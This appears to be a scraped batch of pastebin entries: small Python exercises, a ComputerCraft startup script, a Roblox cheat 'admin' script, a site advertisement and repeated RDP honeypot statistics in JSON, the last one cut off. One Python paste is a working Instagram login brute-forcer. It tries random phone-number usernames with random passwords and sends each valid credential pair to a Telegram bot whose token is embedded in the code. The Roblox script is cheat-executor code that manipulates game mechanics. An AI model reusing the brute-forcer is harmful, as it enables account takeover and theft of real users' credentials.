    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

while True:
	pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
	draw = ImageDraw.Draw(pil_image)

	for i, (x, y, entity) in enumerate(entities):
		x0, y0 = CX, CY
		if_rev = math.pi
		x, y = movement(x, y, x0, y0)
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 0, anchor='nw', image=photo_image)
	root.update()"
iAypqucY,Untitled,smj007,Python,Thursday 7th of March 2024 06:52:17 PM CDT,"class MovingAverage:

    def __init__(self, size: int):
        self.size = size
        self.q = deque()
        self.count = 0
        self.sum = 0      

    def next(self, val: int) -> float:
        self.count += 1

        if self.count <= self.size:
            self.sum += val
            self.q.append(val)
            return self.sum/self.count
        else:
            front = self.q.popleft()
            self.sum = self.sum - front + val
            return self.sum/self.size"
Fs3HAqFL,Untitled,ZeusThon,Python,Thursday 7th of March 2024 06:51:12 PM CDT,"import requests,time,random
from user_agent import generate_user_agent
from random import choice

def i(user,passe):
 
    print(user+"":""+passe)
    oo=user+"":""+passe
    token = ""6944454543:AAFx_LVfmfqJyT8h1yLDxsYosX3BYhoAIlA""
    ID = ""5297215129""
    try:
	    url=""https://www.instagram.com/api/v1/web/accounts/login/ajax/""
	    head={

	'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	'Viewport-Width':'636',
	'X-Asbd-Id':'129477',
	'X-Csrftoken':'KLHFvQGryMJQjfNl8OnSpBedNZw0NOwO',
	'X-Ig-App-Id':'936619743392459',
	'X-Ig-Www-Claim':'0',
	'X-Instagram-Ajax':'1011874869',
	'X-Requested-With':'XMLHttpRequest',
	}
	
	    tim33 = str(time.time()).split('.')[0]
	    data = {
	        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim33}:{passe}',
	        'optIntoOneTap': 'false',
	        'queryParams': '{}',
	        'trustedDeviceRecords': '{}',
	        'username': user,
}
	    ro1= requests.post(url,headers=head,data=data).text
	    
	    if 'userId' in ro1:
	    	print(""done"")
	    	requests.post(f'https://api.telegram.org/bot6944454543:AAFx_LVfmfqJyT8h1yLDxsYosX3BYhoAIlA/sendMessage?chat_id=5297215129&text={oo}')
	    else:
	    	    
	    	print(""erorr"")
    except:
    	i(user,passe)
def Zaid():
  
        Num = ""12345098761234567890""
        Tr = str(''.join(choice([""12"", ""13"", ""14"", ""15"", ""16"", ""17"", ""18"", ""19""])))
        pas = str(''.join(choice(Num) for i in range(7)))
        user = ""+989"" + Tr + pas
        i(user,pas)
while True:
	Zaid()"
tqVxm1HC,Turtle Startup Sequence,Jameelo,Lua,Thursday 7th of March 2024 06:38:09 PM CDT,"--[[
    Startup file, could be useful later but was made at first to resume quarry code when I log back in :3
]]

function checkQuarryInterrupted() -- See if the quarry needs resuming
    -- if the save file exists, then run the quarry program as it'll handle the rest.
    if fs.exists(""common/QPROG"") then
        -- Ideally will use arguments for this but its 1am and I'm tired
        shell.run(""quarry.lua"")
    else
        print(""Quarry program was not in progress when runtime ended."")
    end
end

-- Need to check if commonUtils is installed, if not then do a full install
if fs.exists(""commonUtils.lua"") == false then
    print(""Reinstalling common utility library..."")
    shell.run(string.format(""pastebin run qMyK5xrK"")) -- run pastebin package installer so you get all of my apps >:) mwahaha
end

--os.loadAPI(""commonUtils.lua"")
-- print(""Checking for updates..."")
--[[
    To check for updates:
    Download a temp file & compare it to the current file, similar to my package installer program
    If there is a SINGLE difference, reinstall that program.
]]

-- Can make this next bit optional by having the quarry program raise a flag when running, and lowering it when not, all inside a save file.
print("""")
print(""Resuming quarry program..."")

checkQuarryInterrupted()"
whmAx1BR,Mic Up Admin Script 3.0 / Configs,LegendzHackz,Lua,Thursday 7th of March 2024 06:29:27 PM CDT,"local TeleportService = game:GetService(""TeleportService"")
local ChatService = game:GetService(""TextChatService"")
local HttpService = game:GetService(""HttpService"")
local RunService = game:GetService(""RunService"")
local Workspace = game:GetService(""Workspace"")
local Players = game:GetService(""Players"")
local Player = Players.LocalPlayer
local PlayerGui = Player.PlayerGui
local Admin = PlayerGui.Admin
local PlaceId, JobId = game.PlaceId, game.JobId

local Stalls = Workspace.Stalls

function Shorten(Username)
    local PlayerList = {}
    for _, CPlayer in pairs(Players:GetPlayers()) do
        if CPlayer.Name:lower():sub(1, #Username) == Username:lower() or CPlayer.DisplayName:lower():sub(1, #Username) == Username:lower() then
            table.insert(PlayerList, CPlayer)
        end
    end
    return PlayerList
end

function Say(Message)
    ChatService.TextChannels.RBXGeneral:SendAsync(Message)
end

function Hop()
    pcall(function()
        local Servers = {}
        for _, v in ipairs(HttpService:JSONDecode(game:HttpGetAsync(""https://games.roblox.com/v1/games/"" .. PlaceId .. ""/servers/Public?sortOrder=Asc&limit=100"")).data) do
            if type(v) == ""table"" and v.maxPlayers > v.playing and v.Id ~= JobId then
                Servers[#Servers + 1] = v.id
            end
        end
        if #Servers > 0 then
            TeleportService:TeleportToPlaceInstance(PlaceId, Servers[math.random(1, #Servers)])
        else
            print(""Server not found."")
        end
    end)
end

function FindPlayer(Target)
    pcall(function()
        local FoundMyTargetC = false

        for _, v in ipairs(Players:GetPlayers()) do
            if v.Name == Target then
                FoundMyTargetC = true
                General:SendAsync(""Server Found!"")
                break
            end
        end
    
        if not FoundMyTargetC then
            Hop()
        end
    end)
end

function View(Target)
    getgenv().Configurations.Spectate = true
    
    while getgenv().Configurations.Spectate do task.wait()
        pcall(function()
            if getgenv().Configurations.Spectate then
                Workspace.CurrentCamera.CameraSubject = Target.Character.Humanoid
            end

            local Viewing = Players.ChildRemoved:Connect(function(Child)
                pcall(function()
                    if Child.Name == Target.Name then
                        getgenv().Configurations.Spectate = false
                        Workspace.CurrentCamera.CameraSubject = Player.Character.Humanoid
                    end

                    Viewing:Disconnect()
                end)
            end)
        end)
    end
end

function Hide()
    pcall(function()
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                Player.Character.HumanoidRootPart.Velocity = Vector3.new()
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(getgenv().Configurations.Axis.X, getgenv().Configurations.Axis.Y, getgenv().Configurations.Axis.Z)
            end
        end
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                if FoundPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Jumping then
                    getgenv().Configurations.Axix.Y = -20
                end
            end
        end
    end)
end

function LoopBring()
    pcall(function()
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                Player.Character.HumanoidRootPart.Velocity = Vector3.new()
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0)
            end
        end
    end)
end

function UnView()
    pcall(function()
        getgenv().Configurations.Spectate = false
        Workspace.CurrentCamera.CameraSubject = Player.Character.Humanoid
    end)
end

function Follow()
    pcall(function()
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                local Direction = FoundPlayer.Character.Humanoid.MoveDirection
                local Offset = Direction * getgenv().Configurations.Direction
                Player.Character:SetPrimaryPartCFrame(FoundPlayer.Character.PrimaryPart.CFrame + Offset)
            end
        end
    end)
end

ChatService.MessageReceived:Connect(function(Message)
    for _, FoundPlayer in next, Players:GetPlayers() do
        if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
            if Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""disconnect"" then
                Player:Kick(""You have been disconnected."")
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""bring"" then
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""reset"" then
                Player.Character:BreakJoints()
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""rejoin"" then
                TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Player)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""hide"" then
                getgenv().Configurations.Hide = true
                getgenv().Configurations.LoopBring = false
                getgenv().Configurations.LoopFollow = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unhide"" then
                getgenv().Configurations.Hide = false
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""loopbring"" then
                getgenv().Configurations.LoopBring = true
                getgenv().Configurations.LoopFollow = false
                getgenv().Configurations.Hide = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unloopbring"" then
                getgenv().Configurations.LoopBring = false
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""loopfollow"" then
                getgenv().Configurations.LoopFollow = true
                getgenv().Configurations.LoopBring = false
                getgenv().Configurations.Hide = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unloopfollow"" then
                getgenv().Configurations.LoopFollow = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""hop"" or Message.Text == getgenv().Configurations.Prefix .. ""serverhop"" then
                Hop()
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""findplayer"" then
                FindPlayer(""ChrisEsMiPapi"")
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""spawn"" then
                getgenv().Configurations.LoopBring = false
                getgenv().Configurations.Hide = false

                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unspawn"" then
                Player.Character.HumanoidRootPart.CFrame = CFrame.new(25, 7.5, 86)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""jump"" then
                Player.Character.Humanoid:ChangeState(""Jumping"")
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""view"" then
                View(FoundPlayer)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unview"" then
                UnView()
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""bypassvc"" or Message.Text == getgenv().Configurations.Prefix .. ""bypassvoicechat"" then
                Say(""Loading."")
                task.wait(.1)
                Say(""Loading.."")
                task.wait(.1)
                Say(""Loading..."")
                task.wait(.1)
                Say(""Wait 1 Second(s) to bypass Voice Chat."")
                task.wait(1)
                Say(""Roblox VoiceChat has been successfully bypassed."")
            end
        end
    end
end)

for _, v in next, Admin:GetChildren() do
    if v.Name ~= ""TextLabel"" then
        v.Visible = true
    end
end

while task.wait() do
    pcall(function()
        if getgenv().Configurations.Hide then
            Hide()
        elseif getgenv().Configurations.LoopBring then
            LoopBring()
        elseif getgenv().Configurations.LoopFollow then
            Follow()
        end
    end)
    pcall(function()
        for Iter = 1, 5 do
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.Enabled = true
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.HoldDuration = 0 
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.RequiresLineOfSight = false
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.MaxActivationDistance = 25
        end
    end)
end"
AbE0j3gs,Pastes.io [Pastebin Alternative],xxsa,PHP,Thursday 7th of March 2024 06:27:55 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

More features example share pages QR CODEs - Embed options .. etc
Simple Ads by Google Adsense ( Few rather than Pastebin )
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
Simple & responsive interface
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Ace Editor / Code Mirror
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Report explicit pastes
Socialite (Facebook/Twitter/Google Social login)
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
Auto generated sitemaps
User management
Admin panel to manage pastes, syntax, users, comments, pages, languages, translations & other settings
User profile page
Trending pastes page (day, week, month, year)
QR Code for share
No Captcha for logged in users feature
.. etc"
1pHx47Ut,Untitled,smj007,Python,Thursday 7th of March 2024 06:24:18 PM CDT,"class TwoSum:

    def __init__(self):
        self.nums = defaultdict(int)

    def add(self, number: int) -> None:
        self.nums[number]+= 1

    def find(self, value: int) -> bool:
        for num in self.nums:
            if (value - num) in self.nums:
                # check for duplicates
                if value-num == num:
                    return self.nums[num] > 1
                else:
                    return True
        return False"
L7Yvp1sW,2024-03-07_stats.json,rdp_snitch,JSON,Thursday 7th of March 2024 06:18:13 PM CDT,"{
  ""ip"": {
    ""185.198.69.5"": 18,
    ""185.198.69.27"": 9,
    ""185.198.69.25"": 9,
    ""62.204.41.107"": 6,
    ""185.198.69.24"": 21,
    ""194.165.16.10"": 6,
    ""185.198.69.21"": 12,
    ""185.198.69.30"": 12,
    ""185.198.69.2"": 21,
    ""198.74.56.135"": 3,
    ""185.198.69.9"": 9,
    ""185.198.69.8"": 21,
    ""185.198.69.4"": 12,
    ""212.71.250.240"": 3,
    ""185.198.69.19"": 9,
    ""185.198.69.17"": 12,
    ""185.198.69.26"": 3,
    ""185.198.69.18"": 12,
    ""185.198.69.28"": 12,
    ""185.198.69.29"": 15,
    ""198.235.24.64"": 9,
    ""185.198.69.11"": 12,
    ""185.198.69.14"": 15,
    ""185.198.69.6"": 18,
    ""87.251.75.145"": 12,
    ""185.198.69.16"": 6,
    ""185.198.69.22"": 6,
    ""185.198.69.23"": 9,
    ""159.242.228.116"": 3,
    ""45.88.97.229"": 24,
    ""185.198.69.15"": 3,
    ""64.23.128.235"": 9,
    ""185.198.69.20"": 3,
    ""103.240.6.155"": 6,
    ""185.198.69.7"": 3,
    ""185.170.144.113"": 18,
    ""185.170.144.3"": 6,
    ""185.198.69.3"": 6,
    ""167.94.145.53"": 3,
    ""45.227.254.55"": 12,
    ""198.235.24.136"": 9,
    ""212.70.149.146"": 3,
    ""185.198.69.13"": 3,
    ""27.8.44.19"": 3,
    ""194.165.16.37"": 6,
    ""36.91.222.100"": 3,
    ""185.198.69.31"": 3,
    ""157.230.175.162"": 12,
    ""172.104.208.111"": 3,
    ""45.131.195.151"": 3,
    ""136.239.159.27"": 75,
    ""120.240.145.8"": 3,
    ""45.131.195.22"": 3,
    ""165.154.12.127"": 3,
    ""198.235.24.207"": 9,
    ""62.204.41.123"": 12,
    ""173.239.214.157"": 3,
    ""43.129.180.247"": 3,
    ""194.165.16.11"": 6,
    ""20.42.97.24"": 6,
    ""80.66.88.215"": 3,
    ""198.235.24.248"": 9,
    ""162.142.125.224"": 3,
    ""80.66.76.92"": 6,
    ""188.119.66.107"": 3
  },
  ""asn"": {
    ""AS57523"": 297,
    ""AS59425"": 18,
    ""AS48721"": 18,
    ""AS63949"": 9,
    ""AS396982"": 36,
    ""AS208091"": 21,
    ""AS60068"": 3,
    ""AS174"": 24,
    ""AS14061"": 21,
    ""AS151853"": 6,
    ""AS197414"": 24,
    ""AS398705"": 3,
    ""AS267784"": 12,
    ""AS204428"": 3,
    ""AS4837"": 3,
    ""AS7713"": 3,
    ""AS62240"": 9,
    ""AS17639"": 75,
    ""AS56040"": 3,
    ""AS135377"": 3,
    ""AS132203"": 3,
    ""AS8075"": 6,
    ""AS398324"": 3
  },
  ""isp"": {
    ""Chang Way Technologies Co. Limited"": 297,
    ""Horizon LLC"": 18,
    ""Flyservers S.A."": 30,
    ""Akamai Technologies, Inc."": 3,
    ""Linode"": 3,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 42,
    ""PRCDN-CONSUMER-FR-PAR"": 3,
    ""Cogent Communications"": 24,
    ""DigitalOcean, LLC"": 21,
    ""Giza Network Limited"": 6,
    ""Censys, Inc."": 6,
    ""SS-Net"": 3,
    ""China Unicom Chongqing Province Network"": 3,
    ""PT Telekomunikasi Indonesia"": 3,
    ""Akamai Technologies"": 3,
    ""VPN"": 6,
    ""Converge Information and Communications Technology Solutions"": 75,
    ""China Mobile communications corporation"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""LogicWeb Inc."": 3,
    ""Aceville Pte.ltd"": 3,
    ""Microsoft Corporation"": 6,
    ""Xhost Internet Solutions"": 3
  },
  ""org"": {
    ""Chang Way Technologies Co. Limited"": 297,
    ""Horizon LLC"": 18,
    ""Flyservers S.A"": 18,
    ""Linode"": 6,
    ""Linode, LLC"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 18,
    ""Unknown"": 33,
    ""DigitalOcean, LLC"": 21,
    ""Giza Network Limited"": 6,
    ""Xhostis"": 24,
    ""Censys, Inc."": 3,
    ""UAB Host Baltic"": 12,
    ""4Media Ltd"": 3,
    ""Telekomunikasi Indonesia"": 3,
    ""VPN-Consumer-US"": 6,
    ""Converge Information and Communications Technology Solutions, Inc"": 75,
    ""China Mobile"": 3,
    ""Ucloud Information Technology"": 3,
    ""NSQ-VENTURE"": 3,
    ""Microsoft Azure Cloud (eastus)"": 6,
    ""XHOSTIS"": 3,
    ""Censys Inc"": 3
  },
  ""regionName"": {
    ""Moscow"": 315,
    ""Kaunas"": 18,
    ""New Jersey"": 15,
    ""England"": 3,
    ""California"": 57,
    ""North Holland"": 42,
    ""\u00cele-de-France"": 3,
    ""Hesse"": 27,
    ""Ho Chi Minh"": 6,
    ""Vilnius"": 12,
    ""Plovdiv"": 3,
    ""Chongqing"": 3,
    ""Jakarta"": 3,
    ""Metro Manila"": 75,
    ""Guangdong"": 3,
    ""Dubai"": 3,
    ""Central and Western District"": 3,
    ""Virginia"": 6,
    ""Drenthe"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""Russia"": 315,
    ""Lithuania"": 30,
    ""United States"": 81,
    ""United Kingdom"": 3,
    ""The Netherlands"": 45,
    ""France"": 3,
    ""Germany"": 27,
    ""Vietnam"": 6,
    ""Bulgaria"": 3,
    ""China"": 6,
    ""Indonesia"": 3,
    ""Philippines"": 75,
    ""United Arab Emirates"": 3,
    ""Hong Kong"": 3
  },
  ""account"": {
    ""Administr"": 330,
    ""Test"": 39,
    ""(empty)"": 24,
    ""hello"": 126,
    ""OJflFtniW"": 3,
    ""bGHSaG"": 3,
    ""pQnxTA"": 3,
    ""Domain"": 30,
    ""mUchHhkbA"": 3,
    ""GhxFdf"": 3,
    ""MUBDTA"": 3,
    ""bkrccvfc"": 12,
    ""beio"": 3,
    ""Administrator"": 3,
    ""iQQCaZCEZ"": 3,
    ""RIlJuU"": 3,
    ""xFiSDE"": 3,
    ""xsbXvbIAI"": 3,
    ""ThPUYj"": 3,
    ""GaJlUI"": 3
  },
  ""keyboard"": {
    ""Unknown"": 603
  },
  ""client_build"": {
    ""Unknown"": 603
  },
  ""client_name"": {
    ""Unknown"": 603
  },
  ""ip_type"": {
    ""proxy"": 300,
    ""Unknown"": 186,
    ""hosting"": 69,
    ""mobile & hosting & proxy"": 3,
    ""mobile & proxy"": 24,
    ""hosting & proxy"": 18,
    ""mobile"": 3
  }
}"
sV4x0EWt,2024-03-07_stats.json,rdp_snitch,JSON,Thursday 7th of March 2024 06:16:11 PM CDT,"{
  ""ip"": {
    ""185.198.69.5"": 12,
    ""185.198.69.27"": 6,
    ""185.198.69.25"": 6,
    ""62.204.41.107"": 4,
    ""185.198.69.24"": 14,
    ""194.165.16.10"": 4,
    ""185.198.69.21"": 8,
    ""185.198.69.30"": 8,
    ""185.198.69.2"": 14,
    ""198.74.56.135"": 2,
    ""185.198.69.9"": 6,
    ""185.198.69.8"": 14,
    ""185.198.69.4"": 8,
    ""212.71.250.240"": 2,
    ""185.198.69.19"": 6,
    ""185.198.69.17"": 8,
    ""185.198.69.26"": 2,
    ""185.198.69.18"": 8,
    ""185.198.69.28"": 8,
    ""185.198.69.29"": 10,
    ""198.235.24.64"": 6,
    ""185.198.69.11"": 8,
    ""185.198.69.14"": 10,
    ""185.198.69.6"": 12,
    ""87.251.75.145"": 8,
    ""185.198.69.16"": 4,
    ""185.198.69.22"": 4,
    ""185.198.69.23"": 6,
    ""159.242.228.116"": 2,
    ""45.88.97.229"": 16,
    ""185.198.69.15"": 2,
    ""64.23.128.235"": 6,
    ""185.198.69.20"": 2,
    ""103.240.6.155"": 4,
    ""185.198.69.7"": 2,
    ""185.170.144.113"": 12,
    ""185.170.144.3"": 4,
    ""185.198.69.3"": 4,
    ""167.94.145.53"": 2,
    ""45.227.254.55"": 8,
    ""198.235.24.136"": 6,
    ""212.70.149.146"": 2,
    ""185.198.69.13"": 2,
    ""27.8.44.19"": 2,
    ""194.165.16.37"": 4,
    ""36.91.222.100"": 2,
    ""185.198.69.31"": 2,
    ""157.230.175.162"": 8,
    ""172.104.208.111"": 2,
    ""45.131.195.151"": 2,
    ""136.239.159.27"": 50,
    ""120.240.145.8"": 2,
    ""45.131.195.22"": 2,
    ""165.154.12.127"": 2,
    ""198.235.24.207"": 6,
    ""62.204.41.123"": 8,
    ""173.239.214.157"": 2,
    ""43.129.180.247"": 2,
    ""194.165.16.11"": 4,
    ""20.42.97.24"": 4,
    ""80.66.88.215"": 2,
    ""198.235.24.248"": 6,
    ""162.142.125.224"": 2,
    ""80.66.76.92"": 4,
    ""188.119.66.107"": 2
  },
  ""asn"": {
    ""AS57523"": 198,
    ""AS59425"": 12,
    ""AS48721"": 12,
    ""AS63949"": 6,
    ""AS396982"": 24,
    ""AS208091"": 14,
    ""AS60068"": 2,
    ""AS174"": 16,
    ""AS14061"": 14,
    ""AS151853"": 4,
    ""AS197414"": 16,
    ""AS398705"": 2,
    ""AS267784"": 8,
    ""AS204428"": 2,
    ""AS4837"": 2,
    ""AS7713"": 2,
    ""AS62240"": 6,
    ""AS17639"": 50,
    ""AS56040"": 2,
    ""AS135377"": 2,
    ""AS132203"": 2,
    ""AS8075"": 4,
    ""AS398324"": 2
  },
  ""isp"": {
    ""Chang Way Technologies Co. Limited"": 198,
    ""Horizon LLC"": 12,
    ""Flyservers S.A."": 20,
    ""Akamai Technologies, Inc."": 2,
    ""Linode"": 2,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 28,
    ""PRCDN-CONSUMER-FR-PAR"": 2,
    ""Cogent Communications"": 16,
    ""DigitalOcean, LLC"": 14,
    ""Giza Network Limited"": 4,
    ""Censys, Inc."": 4,
    ""SS-Net"": 2,
    ""China Unicom Chongqing Province Network"": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Akamai Technologies"": 2,
    ""VPN"": 4,
    ""Converge Information and Communications Technology Solutions"": 50,
    ""China Mobile communications corporation"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""LogicWeb Inc."": 2,
    ""Aceville Pte.ltd"": 2,
    ""Microsoft Corporation"": 4,
    ""Xhost Internet Solutions"": 2
  },
  ""org"": {
    ""Chang Way Technologies Co. Limited"": 198,
    ""Horizon LLC"": 12,
    ""Flyservers S.A"": 12,
    ""Linode"": 4,
    ""Linode, LLC"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 12,
    ""Unknown"": 22,
    ""DigitalOcean, LLC"": 14,
    ""Giza Network Limited"": 4,
    ""Xhostis"": 16,
    ""Censys, Inc."": 2,
    ""UAB Host Baltic"": 8,
    ""4Media Ltd"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""VPN-Consumer-US"": 4,
    ""Converge Information and Communications Technology Solutions, Inc"": 50,
    ""China Mobile"": 2,
    ""Ucloud Information Technology"": 2,
    ""NSQ-VENTURE"": 2,
    ""Microsoft Azure Cloud (eastus)"": 4,
    ""XHOSTIS"": 2,
    ""Censys Inc"": 2
  },
  ""regionName"": {
    ""Moscow"": 210,
    ""Kaunas"": 12,
    ""New Jersey"": 10,
    ""England"": 2,
    ""California"": 38,
    ""North Holland"": 28,
    ""\u00cele-de-France"": 2,
    ""Hesse"": 18,
    ""Ho Chi Minh"": 4,
    ""Vilnius"": 8,
    ""Plovdiv"": 2,
    ""Chongqing"": 2,
    ""Jakarta"": 2,
    ""Metro Manila"": 50,
    ""Guangdong"": 2,
    ""Dubai"": 2,
    ""Central and Western District"": 2,
    ""Virginia"": 4,
    ""Drenthe"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""Russia"": 210,
    ""Lithuania"": 20,
    ""United States"": 54,
    ""United Kingdom"": 2,
    ""The Netherlands"": 30,
    ""France"": 2,
    ""Germany"": 18,
    ""Vietnam"": 4,
    ""Bulgaria"": 2,
    ""China"": 4,
    ""Indonesia"": 2,
    ""Philippines"": 50,
    ""United Arab Emirates"": 2,
    ""Hong Kong"": 2
  },
  ""account"": {
    ""Administr"": 220,
    ""Test"": 26,
    ""(empty)"": 16,
    ""hello"": 84,
    ""OJflFtniW"": 2,
    ""bGHSaG"": 2,
    ""pQnxTA"": 2,
    ""Domain"": 20,
    ""mUchHhkbA"": 2,
    ""GhxFdf"": 2,
    ""MUBDTA"": 2,
    ""bkrccvfc"": 8,
    ""beio"": 2,
    ""Administrator"": 2,
    ""iQQCaZCEZ"": 2,
    ""RIlJuU"": 2,
    ""xFiSDE"": 2,
    ""xsbXvbIAI"": 2,
    ""ThPUYj"": 2,
    ""GaJlUI"": 2
  },
  ""keyboard"": {
    ""Unknown"": 402
  },
  ""client_build"": {
    ""Unknown"": 402
  },
  ""client_name"": {
    ""Unknown"": 402
  },
  ""ip_type"": {
    ""proxy"": 200,
    ""Unknown"": 124,
    ""hosting"": 46,
    ""mobile & hosting & proxy"": 2,
    ""mobile & proxy"": 16,
    ""hosting & proxy"": 12,
    ""mobile"": 2
  }
}"
DxPtA0R8,2024-03-07_stats.json,rdp_snitch,JSON,Thursday 7th of March 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""185.198.69.5"": 6,
    ""185.198.69.27"": 3,
    ""185.198.69.25"": 3,
    ""62.204.41.107"": 2,
    ""185.198.69.24"": 7,
    ""194.165.16.10"": 2,
    ""185.198.69.21"": 4,
    ""185.198.69.30"": 4,
    ""185.198.69.2"": 7,
    ""198.74.56.135"": 1,
    ""185.198.69.9"": 3,
    ""185.198.69.8"": 7,
    ""185.198.69.4"": 4,
    ""212.71.250.240"": 1,
    ""185.198.69.19"": 3,
    ""185.198.69.17"": 4,
    ""185.198.69.26"": 1,
    ""185.198.69.18"": 4,
    ""185.198.69.28"": 4,
    ""185.198.69.29"": 5,
    ""198.235.24.64"": 3,
    ""185.198.69.11"": 4,
    ""185.198.69.14"": 5,
    ""185.198.69.6"": 6,
    ""87.251.75.145"": 4,
    ""185.198.69.16"": 2,
    ""185.198.69.22"": 2,
    ""185.198.69.23"": 3,
    ""159.242.228.116"": 1,
    ""45.88.97.229"": 8,
    ""185.198.69.15"": 1,
    ""64.23.128.235"": 3,
    ""185.198.69.20"": 1,
    ""103.240.6.155"": 2,
    ""185.198.69.7"": 1,
    ""185.170.144.113"": 6,
    ""185.170.144.3"": 2,
    ""185.198.69.3"": 2,
    ""167.94.145.53"": 1,
    ""45.227.254.55"": 4,
    ""198.235.24.136"": 3,
    ""212.70.149.146"": 1,
    ""185.198.69.13"": 1,
    ""27.8.44.19"": 1,
    ""194.165.16.37"": 2,
    ""36.91.222.100"": 1,
    ""185.198.69.31"": 1,
    ""157.230.175.162"": 4,
    ""172.104.208.111"": 1,
    ""45.131.195.151"": 1,
